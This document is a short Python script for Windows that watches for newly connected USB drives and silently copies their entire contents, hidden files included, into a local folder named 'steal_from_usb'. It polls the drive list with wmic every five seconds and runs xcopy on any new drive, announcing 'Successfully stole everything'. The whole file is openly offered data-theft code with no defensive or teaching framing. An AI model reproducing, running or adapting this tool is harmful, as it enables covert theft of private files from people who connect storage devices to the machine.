import os, time

def make_file():
    path = "C:\\Users\\user"
    os.chdir(path)
    os.system("mkdir steal_from_usb")

def scan():
    arr = []
    hardDrive = os.popen("wmic LOGICALDISK LIST BRIEF").read()
    hardDrive = hardDrive.split()
    for i in hardDrive:
        arr.append(i)
    arr2=[]
    for i in arr:
        if(":" in i):
            arr2.append(i)
    return arr2

def first_scan():
    arr = []
    hardDrive = os.popen("wmic LOGICALDISK LIST BRIEF").read()
    hardDrive = hardDrive.split()
    for i in hardDrive:
        arr.append(i)
    arr2=[]
    for i in arr:
        if(":" in i):
            arr2.append(i)

    file = open("C:\\Users\\user\\steal_from_usb\\hardwares.txt", "w")
    file.write(str(arr2))
    file.close()
    return arr2

def compare(arr, arr2):
    file = open("C:\\Users\\user\\steal_from_usb\\hardwares.txt", "r")
    hardwares = file.read()
    file.close()
    if(len(arr) == hardwares.count(":")):
        return 0

    else:
        arr3=[]
        x = len(arr) - len(arr2)
        for i in range(x):
            arr3.append(arr[len(arr)-1-i])
        return arr3

def stealing(arr):
    for i in arr:
        os.system("xcopy " + i + "\\ C:\\Users\\user\\steal_from_usb\\ /e /h") # xcopy -> copies everything inside the directory

def Main():
    make_file()
    f = first_scan()
    print("First scan completed\n\n")
    while(True):
        print("---- SCANNING ----\n")
        time.sleep(5)
        s = scan()
        c = compare(s, f)
        if(c != 0):
            stealing(c)
            print("Successfully stole everything\n")

if __name__ == '__main__':
     try:
         Main()
     except Exception as e:
         print(e)
